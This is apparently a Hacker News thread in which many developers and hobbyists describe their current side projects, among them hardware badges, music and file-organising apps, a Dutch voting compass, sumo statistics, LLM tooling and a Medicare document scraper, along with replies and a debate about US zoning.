    &lt;p&gt;I've been making and selling my electronic social battery pin badges for a while now (https://hortus.dev/products/social-battery) and I'm expanding the range with seasonal versions like a Christmas mood badge, and a halloween themed ghost badge that's coming soon. I'm lucky enough that these projects have gone down well and are making enough money to fund some more complicated (and expensive) projects that I wouldn't have otherwise had the guts to try. Currently I'm working on an RGB digital sand timer with customizable timing sequences so that you can use it for things like the pomodoro technique - I have a working prototype and at the moment I'm experimenting with interfaces for setting the sequences. I wanted to use a combination of buttons and an accelerometer for this but it's not as intuitive as I'd like so I may end up making a small smartphone app to configure it.&lt;/p&gt;
    &lt;p&gt;I started a company to grow unlimited eggs from stem cells, based on the work from my recent PhD. This will solve nearly all female infertility and help prevent genetic disease.&lt;/p&gt;
    &lt;p&gt;Are you making a joke, or is there some use for that? (I would think of all species on earth, chickens are the easiest to get eggs for once you exclude the insects, but lack of domain knowledge means I could easily be missing something)&lt;/p&gt;
    &lt;p&gt;Not the person you asked, but there is a lot of research in this for meat so it would be interesting for eggs as well, as replacing them when you are vegan is not that easy.&lt;/p&gt;
    &lt;p&gt;Not OP but I think there are a lot of people (maybe mostly vegans) who would be interested. I have no thought on whether it would be financially viable.&lt;/p&gt;
    &lt;p&gt;I'd be interested just because I'd rather use non-animal alternatives if available.&lt;/p&gt;
    &lt;p&gt;I hope lab-made milk becomes a viable thing even though I'm not vegan or vegetarian. Lab-made eggs would be good too.&lt;/p&gt;
    &lt;p&gt;Working on an AI/Governance and compliance system that also integrates with the cli for teams developing the actual code and the systems that are commonly used, GitHub, bitbucket, open policy agent, collibra etc..&lt;/p&gt;
    &lt;p&gt;Used by enterprises for compliance, reporting and answering questions like, who owns this ai model, whats the monitoring plans, where is it running, what approvals does it have, what policies are applicable (geographic etc).&lt;/p&gt;
    &lt;p&gt;I'm building a tool shed completely from scratch. Actually doing woodwork (ok ok it was also an excuse to get a nice nail gun) and seeing something tangible at the end of your efforts is surprisingly nice if your day job is entirely virtual.&lt;/p&gt;
    &lt;p&gt;I got tired of Spotify recommending me the same songs, from the same artists, over and over again.&lt;/p&gt;
    &lt;p&gt;So I built Riff Radar - it creates playlists from your followed artists' complete discography, and allows you to tailor them in multiple ways. Those playlists are my top listened to. I know, because you can also see your listening statistics (at the mercy of Spotify's API).&lt;/p&gt;
    &lt;p&gt;The playlists also get updated daily. Think of it as a better version of the daily mixes Spotify creates.&lt;/p&gt;
    &lt;p&gt;Replicated Data exchange format, RDX. A JSON superset that has diff, patches, branches and merges. Once you have that ability at the data format level, many things become surprisingly straightforward. https://github.com/gritzko/go-rdx&lt;/p&gt;
    &lt;p&gt;I pride myself on being pretty well organized with my digital life, especially files and folders. I’ve been using Hazel (God Knows, since it's beta). Recently, I realized it has become a muscle memory for me to name/rename files, and drop them where they belong while I'm working on or as it happens. This works for me now because I have a weekly routine of digital chores that picks up any slack and missing things that I missed during my days. Compound this with the fact that I have reduced a lot of clutter, minimized things that I’m involved in. That worked. I did away with Hazel since the beginning of 2025 and I didn’t missed it.&lt;/p&gt;
    &lt;p&gt;However, I’ve been sheepishly and shamefully looking at either an AI-assisted solution to even do away with the last mile cleanups and organization that I do.&lt;/p&gt;
    &lt;p&gt;Your text above is good enough marketing for me, and your website’s content sealed it. Didn’t even look further. I’m your customer now. And, personally, have always loved supporting other founders/builders building interesting tools and utilities.&lt;/p&gt;
    &lt;p&gt;Edit: I just realized this is not compatible with Intel Macs which I wanted to use on too. I didn’t read everything on the website, did I?&lt;/p&gt;
    &lt;p&gt;Suggestion: Please send me an email after successful purchase, so I have a record.&lt;/p&gt;
    &lt;p&gt;This might be what I've been looking for. On the first of every month I have Hazel put everything in ~/Downloads/yyyy-mm (previous month), with the intent to move each file to the correct project/area folder in my actual file structure. But I'm about 1.5 years behind on that...&lt;/p&gt;
    &lt;p&gt;Have you looked at competitors? If so, what are they? I haven't found anything that does this as elegantly as Fallinorg.&lt;/p&gt;
    &lt;p&gt;Working on a dutch voting compass that uses real world motion votings as a way to determine which party fits you best. The Netherlands got an open API for this since last year, so it felt appropriate to start using it.&lt;/p&gt;
    &lt;p&gt;Top man! Thanks, I went trough the votings to see if the party I was thinking of matched actual voting behaviour in the 2e Kamer. It kinda did, but I was suprised another party matched a bit more.&lt;/p&gt;
    &lt;p&gt;Since that second party also comes forward in other voting compasses I might be more inclined now to vote them instead.&lt;/p&gt;
    &lt;p&gt;Super goed idee! Ik zie dat de titels/bronlink soms niet overeenkomen met het kernverzoek en beschrijving eronder, daar gaat iets niet goed. Misschien ligt dat aan de open data.&lt;/p&gt;
    &lt;p&gt;Currently it mainly focuses on libGDX which is my most favorite framework. I prefer code-centric approach because that's how game development should be in my opinion.&lt;/p&gt;
    &lt;p&gt;Most of the tutorials are just pure coding with algorithms explanations. My goal is to build one of the most resourceful website for libGDX because it's quite underserved at the moment.&lt;/p&gt;
    &lt;p&gt;In the future I may expand to other code-centric frameworks and more general game development topics, let's see how it go.&lt;/p&gt;
    &lt;p&gt;First time hearing about libGDX. Do you have any resources on why it's your favorite framework? It might be useful for your website as well. To sort of "sell" the framework to game developers who have not used it before.&lt;/p&gt;
    &lt;p&gt;libGDX is not in the same spotlight as Godot or Unity but still popular within Java devs circle.&lt;/p&gt;
    &lt;p&gt;I'm not aware of any resources explaining the "why libGDX" but here are some differences, speaking from my own experiences:&lt;/p&gt;
    &lt;p&gt;- Code oriented development, no authoring tool, no drag and drop, just you and the API, which might attracts traditional devs who prefer a pure coding approach.&lt;/p&gt;
    &lt;p&gt;- Very thin abstraction over the platform graphics layer, it just adds a few more drawing APIs over the underlying graphics API (OpenGL and WebGL). You’re free to build your own abstractions on top of the core APIs.&lt;/p&gt;
    &lt;p&gt;- Java, while might be verbose, is very stable, easy to learn and has huge ecosystem. Or you can just use Kotlin.&lt;/p&gt;
    &lt;p&gt;- Once you learn the ins and outs of the framework, it actually has a greater sense of freedom compared to Unity, Godot, Unreal, etc because those engines always force you to do things in their own opinionated ways.&lt;/p&gt;
    &lt;p&gt;After I made a small MMO prototype over at https://everwilds.io/ (open-source) I am now working on a vehicle building prototype at https://evergate.io/, if you're interested in following the progress there's a Discord link at the top right corner of each website. Mainly focused on Evergate right now :))&lt;/p&gt;
    &lt;p&gt;I'm working on an audiobook service (currently for myself) that will fill in major missing features for platforms like Audible.&lt;/p&gt;
    &lt;p&gt;- Ignore AI voiced books&lt;/p&gt;
    &lt;p&gt;- Show me unread books in series that I have in my library&lt;/p&gt;
    &lt;p&gt;- Experimenting with better search. I have experience with building semantic search systems and have been highly disappointed with Audible's extremely sub-par search capabilities. I want results that are actually based on books, authors, and narrators that I have already purchased, read, or listened to.&lt;/p&gt;
    &lt;p&gt;- Get automatic notifications when new books from authors and narrators that I subscribe to become available.&lt;/p&gt;
    &lt;p&gt;There's at least a few more gripes I want to address, but these are the high priority ones that come to mind right now.&lt;/p&gt;
    &lt;p&gt;My biggest issue these days, is that after spending 1000 hours messing around in eleven labs, almost all female american audiobook narrators sound AI generated to me. I feel like as a demographic they must have sold a lot of voice recordings to the platform for analysis. I have DNR'ed a few audiobooks recently due to this.&lt;/p&gt;
    &lt;p&gt;I'm working on Macscope (https://macscope.app), a better Cmd+Tab for macOS. I built it because macOS window management feels slow compared to the keyboard-driven speed of a terminal or code editor.&lt;/p&gt;
    &lt;p&gt;It augments your existing muscle memory: a quick tap of a shortcut switches apps like normal, but holding it opens a powerful interface with features like:&lt;/p&gt;
    &lt;p&gt;Unified Search: Instantly find any window, app, or browser tab.&lt;/p&gt;
    &lt;p&gt;Scopes: Save and restore entire window layouts for different projects (perfect for after you unplug a monitor).&lt;/p&gt;
    &lt;p&gt;Placement Modes: Snap windows to screen halves as you switch to them.&lt;/p&gt;
    &lt;p&gt;The goal is to make the OS feel as fast as my other tools. I'm always looking for feedback on how to make window management less frustrating!&lt;/p&gt;
    &lt;p&gt;I’m building a daily word puzzle game with a twist!&lt;/p&gt;
    &lt;p&gt;In Tiled Words you rearrange tiles to solve clues and rebuild a broken crossword.&lt;/p&gt;
    &lt;p&gt;You can play a demo at https://tiledwords.com - it’s free and web based so it works on whatever device you’ve got.&lt;/p&gt;
    &lt;p&gt;I’ll be officially launching on October 19th at the Portland Retro Gaming Expo. You can sign up to be notified on launch. Starting then there will be a new puzzle every day!&lt;/p&gt;
    &lt;p&gt;So far I’ve gotten really positive feedback and have around 100 people signed up to get notified. It’s been a lot of fun to build!&lt;/p&gt;
    &lt;p&gt;Cool idea. One suggestion is to allow a selection box to be dragged around a block of letters. Once selected, all of the tiles in the area could be dragged at once.&lt;/p&gt;
    &lt;p&gt;That would reduce the frustration of having to move a large chunk of words around piece by piece. It would be better than the existing affordance, which moves the whole grid.&lt;/p&gt;
    &lt;p&gt;Working on a personal recruiter / talent agent for my smartest dev/product/design friends (and theirs) https://www.hedgy.works&lt;/p&gt;
    &lt;p&gt;Key problems we're solving:&lt;/p&gt;
    &lt;p&gt;- Everyone wants to be doing meaningful, fun work that feels like their "life's work". Few feel like they are.&lt;/p&gt;
    &lt;p&gt;- In recruiting, the AI spam problem is real and only getting worse, essentially killing the cold application pipeline. You need a referral.&lt;/p&gt;
    &lt;p&gt;- Optimizing your career feels like annoying politicking for a lot of the most talented folks who just want to focus on building cool stuff. But, as an employee, if you don't test the market (e.g. take a recruiter conversation) from time to time, your comp can really stagnate.&lt;/p&gt;
    &lt;p&gt;Continuing to do a lot of historical review of early AI stuff. Just finished the Semantic Information Processing[1] book edited by Marvin Minsky, and now I'm reading Volume 1 of the Parallel Distributed Processing[2 book by Rumelhart and McClelland. After that, I have Principles of Semantic Networks[3] by John F. Sowa queued up.&lt;/p&gt;
    &lt;p&gt;Along with all of that, still working on a lot of stuff using Jason[4] / AgentSpeak[5]. I created a fork[6] of Jason that is meant to be easier to integrate with Spring Boot, and to take more of a "run headless on a server" approach, which meant taking out references to a Swing based in-process logging/management tool. In place of that, I'm implementing a JMX based management interface, and recently I've started to work on replacing the old Swing app with a JavaFX app that can connect using JMX Remoting.&lt;/p&gt;
    &lt;p&gt;It's funny you say that. I already do run a weekly "book club" group, but it's at work at my $dayjob employer. And, for various reasons, we've drifted away from the book focus and turned into a more presentation/discussion oriented group. But I still love to read physical books, and wouldn't be opposed to trying to come up with something to structure some discussion around some of these "outside of work" readings that I do.&lt;/p&gt;
    &lt;p&gt;If you want, drop me and email (prhodes@fogbeam.com) and maybe we can set something up.&lt;/p&gt;
    &lt;p&gt;I am working on FastFileLink (https://fastfilelink.com/), yet another file-sharing CLI/app that uses WebRTC for P2P transfer but exposes HTTPS links, making it compatible with browsers and tools like curl/wget.&lt;/p&gt;
    &lt;p&gt;It's ~90% production-ready. We use it internally to move files between containers and hosts (especially when volumes aren't mounted), and for WFH employees to exchange large files without a relay server. For huge files, there's resumable upload to our infra-backed server — fast global downloads included.&lt;/p&gt;
    &lt;p&gt;The CLI will also support receiving files via WebRTC, but that feature hasn't been released yet. It is open source (https://github.com/nuwainfo/ffl), but the README hasn't been updated yet and the code is not synced with the latest version (working on these).&lt;/p&gt;
    &lt;p&gt;Another production-used tool I'm working on is MailTrigger (https://www.mailtrigger.net/) — a programmable SMTP server that turns any email into a message on LINE, Slack, Teams, Telegram, SMS, or basically anything. If your app can send email, it can trigger multi-channel notifications with zero extra code.&lt;/p&gt;
    &lt;p&gt;Think of it as “SMTP to Anything,” or an email-native IFTTT/Zapier.&lt;/p&gt;
    &lt;p&gt;It supports JS and WASM for preprocessing, routing, and automation — you can write custom logic, auto-reply with LLM-generated messages, or forward alerts intelligently. We use it for price drop alerts, server health monitoring, and integrations with Jenkins/Sentry to push incidents to our DevOps Telegram channel.&lt;/p&gt;
    &lt;p&gt;Also experimenting with LLM-assisted rule creation: you can define notification logic in natural language instead of writing code — for example, auto-reply with an LLM-generated joke or handle customer support queries dynamically.&lt;/p&gt;
    &lt;p&gt;Docs are more complete than the website (which is still evolving), and the pricing page is currently a placeholder. Already running in production for us and a few early adopters.&lt;/p&gt;
    &lt;p&gt;I've been working on a map that shows which neighborhoods in a city are nice/not nice with a short description.&lt;/p&gt;
    &lt;p&gt;Whenever I visit a new city, just looking at Google Maps is pretty meaningless - it's just a bunch of gray land and streets. I end up looking up Reddit posts for where to go, searching for crime maps, trying to find annotated maps, etc. to get a better idea of where to visit in a city (or even live, like when I had moved to Austin). AI generated scoring and descriptions, while imperfect, have already helped me when visiting SF recently. Early stage, so please help with submitting corrections, if you'd like!&lt;/p&gt;
    &lt;p&gt;I just checked a few cities I have been to and this seams surprisingly accurate. May I ask how you are collecting this data. Is it through Google reviews or how do you collect this data?&lt;/p&gt;
    &lt;p&gt;I like the idea! In my opinion (looking at SF) it’s still too low resolution. SF in particular can vary greatly in safety, walkability, etc. even a few blocks over within a neighborhood.&lt;/p&gt;
    &lt;p&gt;Very cool! I really like the idea, the way I'd develop this further is by having live crimes reporting on it so that you know which streets to avoid , similar to what waze does where people report items&lt;/p&gt;
    &lt;p&gt;I'm working on learning to sightread on bass, and wanted to gamify it.&lt;/p&gt;
    &lt;p&gt;Unfortunately rocksmith doesn't seem to have a sheet music view, so I'm trying to write something that will take the input from my audio interface and put it through a note detection library (and then compare to a midi for an accuracy score) to make my own version.&lt;/p&gt;
    &lt;p&gt;Continuing to build https://crucialexams.com/, a platform that helps people prepare for IT certifications like CompTIA, AWS, and Microsoft/Azure. It offers realistic practice tests and study tools. I also have partnered with educators and universities who now offer it to their students and get dashboards to review student progress and identify where they are struggling.&lt;/p&gt;
    &lt;p&gt;Every two months there’s a 15-day tournament where 670 rikishi(sumo wrestler) fighting ~160 matches each day. I’m recording all the results and kimarite (winning moves) into a browsable database with charts and videos.&lt;/p&gt;
    &lt;p&gt;Recently I have been using Gemini to process and edit the daily match videos. It works surprising well. It can detect the start/end of each bout, recognise the wrestlers and assign the correct rikishi id to them.&lt;/p&gt;
    &lt;p&gt;Still early, but if you want to get into Sumo feel free to join! Its fun to watch and the matches are quick!&lt;/p&gt;
    &lt;p&gt;Sumo fan here, this is cool. UI is great. I assume you know about sumodb? I don't say that to discourage you, but people are tracking stats.&lt;/p&gt;
    &lt;p&gt;Since you are good at UI, here's something I would really like: a Natto-style page for each bout that I can manually page through as I watch the basho. Since Natto is underground, I have to watch the basho on NHK or Abema or via Kintamayama - all fine, but I miss the Natto graphics. If you could do that in a way that I could tap through each match, I'd use it every day of the basho and I think so would everyone on r/sumo.&lt;/p&gt;
    &lt;p&gt;BTW if you don't know what I'm talking about, reach out and I will explain.&lt;/p&gt;
    &lt;p&gt;I was testing something like this with https://sumostats.com/live (a second-screen style page, so you can quickly look up the current match and it follows along live).&lt;/p&gt;
    &lt;p&gt;But I think I know what you mean... I'll check out Natto graphics again (haven't seen it in a while) and will try make something up for next basho!&lt;/p&gt;
    &lt;p&gt;I'm putting a bunch of security tools / data feeds together as a service. The goal is to help teams and individuals run scans/analysis/security project management for "freemium" (certain number of scans/projects for free each month, haven't locked in on how it'll pan out fully $$ wise).&lt;/p&gt;
    &lt;p&gt;I want to help lower the technical hurdles to running and maintaining security tools for teams and individuals. There are a ton of great open source tools out there, most people either don't know or don't have the time to do a technical deep dive into each. So I'm adding utilities and tools by the day to the platform.&lt;/p&gt;
    &lt;p&gt;Likewise, there's a built in expert platform for you to get help on your security problems built into the system. (Currently an expert team consisting of [me]). Longer term, I'm working on some AI plugins to help alert on CVEs custom to you, generate automated scans, and some other fun stuff.&lt;/p&gt;
    &lt;p&gt;It's been a while since I've used CloudWatch myself. How would you expect this? IE would you lean more towards having a lambda/firehose that forwards events to to the API (which is [public](https://tailstream.io/docs/api) by the way!) or would you expect some kind of agent / connector to run that automatically pulls the logs from CloudWatch?&lt;/p&gt;
    &lt;p&gt;I’ve been working more on the unit economics of my data union/trust idea (https://wherelabs.info/).&lt;/p&gt;
    &lt;p&gt;What I’m trying to understand is whether it is viable to pay people ~$5 per week for sharing their location data and demographics based on a 90% share of revenue from sales of data products built on that data. (But without ever selling or exposing individual level data).&lt;/p&gt;
    &lt;p&gt;I’ve been building Flare (https://www.getflare.app/), an app for people with chronic skin conditions (eczema, rosacea, etc).&lt;/p&gt;
    &lt;p&gt;It lets you log symptoms and triggers, but the bigger vision is being able to discover patterns, ask questions about your own data, etc.&lt;/p&gt;
    &lt;p&gt;Being able to answer questions like “Do my flare-ups correlate with stress?” or “What foods make things worse?” backed with personalized data has been helpful with my own flares.&lt;/p&gt;
    &lt;p&gt;Still early, but curious to hear thoughts from folks!&lt;/p&gt;
    &lt;p&gt;I've been contributing to a project called Folk computer[1]. It's focused on creating a physical medium for computing (think printing out a program, which is then tracked by the computer. There's some really cool spatial interaction that happens). Folk v2 is currently in development, so I've been digging into the guts of the datalog-like engine. It's been a lot of fun to pick up C and see it applied to a project I can directly interact with!&lt;/p&gt;
    &lt;p&gt;I’ve been working on an app called Lång. A daily spending guide. It shows you what’s okay to spend based on how much needs to last how long.&lt;/p&gt;
    &lt;p&gt;For over a decade, I’ve thought about how most people seem to resist the advice about money. And also how all advice is based on the same idea: seeing where your money went and making monthly plans based on that.&lt;/p&gt;
    &lt;p&gt;I think people feel that this is a poor match for how money works. So they improvise. And because we tend to not discuss money with others, they improvise on their own. What this typically looks like is checking their balance and trying to pace things.&lt;/p&gt;
    &lt;p&gt;I’ve been trying to design the app around that. Providing support to what seems like a natural, instinctive approach to managing money.&lt;/p&gt;
    &lt;p&gt;I've been wanting to build something like this for myself, but partnering/integrating with banks seems to be the main difficulty. How do you solve this?&lt;/p&gt;
    &lt;p&gt;And which cards / banks does it support?&lt;/p&gt;
    &lt;p&gt;Also, what does the name mean? It might be a tad difficult to google, unfortunately, since I imagine that googling "lang" would come up with a lot of other results.&lt;/p&gt;
    &lt;p&gt;It doesn’t integrate with banks. You log as you spend. It’s a common question, but I think there are many reasons to keep it manual. It keeps you aware of what you have left. And automation won’t ever be perfect, so you must keep an eye on it and adjust things.&lt;/p&gt;
    &lt;p&gt;The app focuses just on your everyday spending. You don’t log bills and subscriptions. And it’s not about being exact. You can add the rough total of what you spent. It acknowledges that when you plan your spending, it’s really just a guess. And you’ll adjust the plan as you go.&lt;/p&gt;
    &lt;p&gt;What did you have in mind when you thought about building something like this?&lt;/p&gt;
    &lt;p&gt;The name means ’long’, and is pronounced similarly. Naming is of course hard. I’m hoping that it will be something you remember.&lt;/p&gt;
    &lt;p&gt;I'm finally organising 20 years of voice notes. Some were quite outdated - I probably no longer need the mozzarella cheese I reminded myself to buy in early 2008.&lt;/p&gt;
    &lt;p&gt;To organize them, I'm writing a Python Qt application with Claude Code. It started off as vibe coding, but I'm now developing it using processes very similar to those I would use when managing software teams. I've picked up a lot of good tips about that here on HN. I've got Whisper, and fallback online services, transcribing the audio and summarizing it and adding tags. After much UI experimentation, I've landed on something that looks not unlike an email client, with tags in the left pane, a center pane which lists transcriptions and notes about each audio file, and a right pane with more detailed information about the selected audio file.&lt;/p&gt;
    &lt;p&gt;Next step is to serve it all as a model context protocol server - I need to pick an agent.&lt;/p&gt;
    &lt;p&gt;I'm working on ScaleDown [1], a context pruning API.&lt;/p&gt;
    &lt;p&gt;So over the past few years, I have seen how contexts have been steadily growing in AI apps. And while the context lengths of LLMs have also been increasing, they are still effectively about 200k tokens. The performance drops off a cliff after that (you might have noticed it as well with long AI chats).&lt;/p&gt;
    &lt;p&gt;It is a simple API that prunes away irrelevant parts of a context for a given prompt, a.k.a. context-aware pruning. Integration is super simple: just an extra API call before the final LLM API call. You can get an API from the website.&lt;/p&gt;
    &lt;p&gt;I would love to chat if this is something that is relevant to you and if you have any feedback on what we are building!&lt;/p&gt;
    &lt;p&gt;I'm trying to make an RF lightning detector small enough to trivially add to my motorbike.&lt;/p&gt;
    &lt;p&gt;I live in Viet Nam, and driving through bad storms this time of year is pretty miserable, and they happen fast and are local enough that weather prediction is not terribly useful.&lt;/p&gt;
    &lt;p&gt;There are a lot of problems with EMI. Lots of ungrounded brushed motors everywhere that make the RF bits hard. If I succeed, I'll publish the PCB designs.&lt;/p&gt;
    &lt;p&gt;I've also got some educational products in production right now, about Vietnamese history. I'd share a link, but my website probably can't handle the traffic right now.&lt;/p&gt;
    &lt;p&gt;Postply uses full-context to generate better replies on X, Instagram, Facebook &amp;amp; LinkedIn. It supports custom reply profiles and styles for support teams and social media managers. There are clearly a lot of AI replies on social media already, but they are really generic and bad. With Postply.com I'm hoping it will help people generate better and more meaningful replies.&lt;/p&gt;
    &lt;p&gt;I still am not sure exactly how to define it, but it's a ruby library, that is mix of a rules engine+spreadsheet feelings+array language+static validation+compiled/codegen... that last part is mostly not merged yet but yeah, ruby DSL codegenerating ruby, it's ruby all the way.&lt;/p&gt;
    &lt;p&gt;https://github.com/amuta/kumi/tree/codegen-v5 (see ./golden for more context on the compilation/codegen. I barely knew what a compiler was before doing this so I might have just created some nonsense )&lt;/p&gt;
    &lt;p&gt;Fluxmail is an AI-powered email app that helps you get done with email faster. I think there's a significant opportunity for AI to change the way we use email, and I'm experimenting with ways to improve the status quo. I'd love to hear what features you'd like to see in such an app!&lt;/p&gt;
    &lt;p&gt;This is a job board for AI jobs and companies. The job market in AI is pretty hot right now, and there are a lot of cool AI companies out there. I'm hoping to connect job seekers with fast-growing AI companies.&lt;/p&gt;
    &lt;p&gt;I'm working on Pruno (https://pruno.dev/), it's similar to Dependabot/Renovate bot but it removes dependencies instead.&lt;/p&gt;
    &lt;p&gt;My team suffers from dependency creep. As soon as your system grows, the number of dependencies skyrockets. In Python/Javascript projects it's especially hard to determine which dependencies are not used anymore.&lt;/p&gt;
    &lt;p&gt;Pruno saves time for your team by automating this work. It's still WIP, but I'd like to get feedback. How are you dealing with your dependencies?&lt;/p&gt;
    &lt;p&gt;Tech side project: crawlers that doomscroll job boards for me, and a Tinder clone that swipes through them. I recently broke out the actual automation logic into something more recyclable for scaling out to new targets (and broke out the HTML parsing for possible use outside my browser automation flow). Still figuring out how I want to handle datasources as both an API and a plugin architecture, but the goal is to eventually be able to configure searches through the API, to manually trigger and/or setup scheduled runs.&lt;/p&gt;
    &lt;p&gt;Personal side project: extensive cleanup of my family's place. I'm just now approaching a decent first pass at the outside, and have to tear apart a basement next. It's taken most of this year. It's not the specific reason I've farmed collecting search results off to a bot&lt;/p&gt;
    &lt;p&gt;For-fun thing: CTF puzzles. I'm not very good at them, but they're useful for other things. I fell down the scraping rabbit hole this way, and I'm currently using a series of them to finally get some exposure to Python. I also have a writeup half-written about this exact process&lt;/p&gt;
    &lt;p&gt;As someone who's curious (I see lots of room for improvement in terminals!), I can't tell what this does from the website, other than the ability to load and view 3d models.&lt;/p&gt;
    &lt;p&gt;I built a fantasy football rankings app using claude code, and it has been blowing up in the fantasy football subreddit. Funny enough, it's forcing Yahoo to change their site and improve their layout which ruined all my automation. Surprised how much traffic it's receiving every week just for a better layout.&lt;/p&gt;
    &lt;p&gt;It started as a solution to LLM front ends having terrible native branching features. But slowly I realize most of our data will be going through LLM's so Yggdrasil is evolving into a platform which consumes all your LLM queries, while keeping it easy to query and reference.&lt;/p&gt;
    &lt;p&gt;And now I have begun to realize how detrimental LLM assisted coding can be to someone who starts depending on it too much, so Yggdrasil is a bet in the other direction as compared to mainstream. Instead of agents/AI doing everything I believe human + ai assistance will win in the end.&lt;/p&gt;
    &lt;p&gt;Yggdrasil has a simple agent called Valkyrie, so they have their place, but that I believe should be the last step, after the developer has discussed and planned thoroughly through our tree interface, Heimdall.&lt;/p&gt;
    &lt;p&gt;And if someone replaces the dev, they can browse their conversations with the LLM, observe their mind map, what questions they asked, what extra things they considered (branches), the whole thought process easily navigable and visible.&lt;/p&gt;
    &lt;p&gt;Personally after using Yggdrasil, I feel quite confident in using the LLM, as I can ask all the silly questions I want, without worrying about context pollution. It aligns really well with the natural exploratory tangential thoughts we have when trying to find solutions or learn something.&lt;/p&gt;
    &lt;p&gt;Solo-building this project for some time, going to launch the first version in a week or so!&lt;/p&gt;
    &lt;p&gt;https://elmo.dev - a tool that automatically builds a searchable knowledge base around your project based on your conversation with coding tools.&lt;/p&gt;
    &lt;p&gt;It works automatically and doesn't require your attention. To build KB it uses same tool as you (claude/codex/gemini) so it uses the same quota and you don't have to pay additionally for the AI running it.&lt;/p&gt;
    &lt;p&gt;The result is ./elmodocs directory in the root of your project. You can reference CLAUDE.md/AGENTS.md/GEMINI.md to this directory or directly include the whole directory or its parts into the coding context.&lt;/p&gt;
    &lt;p&gt;I left my job to work on my side project (MCP-B: https://news.ycombinator.com/item?id=44515403) full time. I set out with the goal of making the ability to vibecode a webMCP server for your website and inject it via userscript.&lt;/p&gt;
    &lt;p&gt;While building that, I basically wrote a modern version of Tampermonkey with its own marketplace built in. So you can vibe code any userscript and publish it to the marketplace all within the extension.&lt;/p&gt;
    &lt;p&gt;The automation stuff is still the core value-prop, but this is a fun bonus feature while I work on solidifying the automation features.&lt;/p&gt;
    &lt;p&gt;I'm writing a HN post for it. Excited to show everyone in a couple weeks here.&lt;/p&gt;
    &lt;p&gt;Control swarms of drones with an easy sdk. Building open source drone swarm software, for use cases like drone laser tag, farm monitoring, security etc. https://tensorfleet.net&lt;/p&gt;
    &lt;p&gt;Trying to re-legalize "neighborhood commercial" by right in the city I live in. Things like corner stores or small barber shops or coffee shops or converted restaurants. ACUs or Accessory Commercial Units, home conversions... different ways of doing it.&lt;/p&gt;
    &lt;p&gt;Great. I assume you live in the US ? Your urban planning law are atrocious. In countries like thailand for instance it's very common to have a shop in the house. Things go nicely and it's more lively. Good luck, that a good project at the root of so many issues&lt;/p&gt;
    &lt;p&gt;If you have a shop in a house in Thailand and a crazy person decides he likes the shop and stays in front of it all day yelling, in Thailand, the people in the house call the police, who make the crazy person leave. In the US, every person, crazy or not, has Freedoms and Rights, and the police won't do anything to help the people in the house because it would be wrong according the the US way of thinking to curtail the Rights and Freedoms of the crazy person (who is yelling all day near the shop, which is very near the house).&lt;/p&gt;
    &lt;p&gt;Consequently, owners of houses in the US try to make it as boring as possible and as useless as possible for any crazy person, homeless person or group of teenagers to hang around near the house. One way they do this is to make sure the house is surrounded only by other houses, trees, parking spaces and roads (and there is not anything as useful or interesting as a shop in easy walking distance).&lt;/p&gt;
    &lt;p&gt;This is a bit of an exaggeration, but it is directionally accurate.&lt;/p&gt;
    &lt;p&gt;No, it's mostly just car-brain where people think that cities should be designed around cars cars and cars, and then if there's room left over, maybe some shops and homes.&lt;/p&gt;
    &lt;p&gt;So they worry about a neighborhood shop taking up the precious, precious parking spots or causing 'traffic!' even if in reality it reduces it because people have something close by their home they could even walk or bike to.&lt;/p&gt;
    &lt;p&gt;So the root problem is not the American commitment to rights and freedoms (especially for the disadvantaged) that Americans discuss constantly -- often in heated, emotional or abstract terms and sometimes in frankly ideological terms. According to you the root problem is an irrational and destructive commitment to automobiles, which (at least after the 1960s) Americans talk about much less than they talk about rights and freedoms -- and when they talk about them, they talk mostly in pragmatic terms, e.g., miles per gallon, turning radius, maintenance costs and space for car seats for children.&lt;/p&gt;
    &lt;p&gt;I live in a city of 100K people, where there really aren't that many visible people with mental health issues or drug problems. I also go to a lot of city council meetings and hearings and observe local social media.&lt;/p&gt;
    &lt;p&gt;After that Deus Ex remaster fiasco, I wanted to see how the famous Unreal 1 dithering technique would look on Quake's software renderer. Getting a clean build of it on Linux was fun in itself: https://github.com/klaussilveira/exp-quake&lt;/p&gt;
    &lt;p&gt;I'm building an app to help people memorize Kanji by turning the characters into vivid, memorable images with accompanying mnemonic stories.&lt;/p&gt;
    &lt;p&gt;I think AI image and video models have reached a point where they can offer a completely new approach to language learning.&lt;/p&gt;
    &lt;p&gt;Next, I'm planning to add features that use AI to generate comic strips (using Seedream or Nano Banana), songs (using Suno) and videos (using Veo 3 or Seedance) to make learning Kanji even more engaging.&lt;/p&gt;
    &lt;p&gt;Impressive! Feels really responsive. I feel the controls are a little unusual though: WASD corresponds to actual map orientation rather than to where the character is facing. I find it confusing when playing together with a mouse, where I would expect I can hold W to move forward while using the mouse to control the character's orientation and direction.&lt;/p&gt;
    &lt;p&gt;The initial implementation actually used that approach - but I got some complaints from people saying it felt weird and I changed it. That was a long time ago during prototyping though - might change it back and see how it feels now (or just add an option). Thanks for the feedback.&lt;/p&gt;
    &lt;p&gt;Really cool, but please consider adding support for using the arrow keys and/or changing the keybindings. Right now it's unplayable unless you're using a QWERTY layout.&lt;/p&gt;
    &lt;p&gt;A webscraping / data pipeline to get the .pdf "Explanation of Benefits", "Proof of Coverage", and "Drug Formulary" for every Medicare Advantage plan in the USA&lt;/p&gt;
    &lt;p&gt;These docs are gonna be used in a product for medicare brokers (if you are/know one please reach out open enrollment starts Nov.1!), and the pipeline is horizontally scalable to ingest updated 2026 plans overnight @ start of open enrollment (though some companies are posting updated plans earlier)&lt;/p&gt;
    &lt;p&gt;There are some clever tricks at play but mostly it's bog-standard browser automation; I'm also in an interview process with 2 entities (one funded startup and one massive corporation) talking about web automation roles, and while it's frustrating that they're moving so slowly it's working out to give me time to build this well.&lt;/p&gt;
    &lt;p&gt;I’m building a text editor inspired by ed, but instead of editing files on disk, it edits live network flows. In this model, files don’t exist as static objects—they exist in motion.&lt;/p&gt;
    &lt;p&gt;Creating a file generates a self-sustaining pattern of packets circulating through the network, and editing it changes the flow itself. Multiple users can edit the same file simultaneously, because the file isn’t tied to any machine—it’s in the network.&lt;/p&gt;
    &lt;p&gt;The interface is familiar if you’ve used ed, with commands like append, delete, and substitute, but behind the scenes it’s all live traffic. You can even discover existing flows and jump into them in real time.&lt;/p&gt;
    &lt;p&gt;It’s a Linux proof-of-concept using raw sockets, and the goal is to explore what files could be if we thought of them as living, circulating processes rather than static storage.&lt;/p&gt;
    &lt;p&gt;I'm still working on Danger World (https://danger.world), my casual 2D narrative adventure with turn-based RPG elements. Built in Flame, on top of Flutter for iOS, Android, Windows and MacOS.&lt;/p&gt;
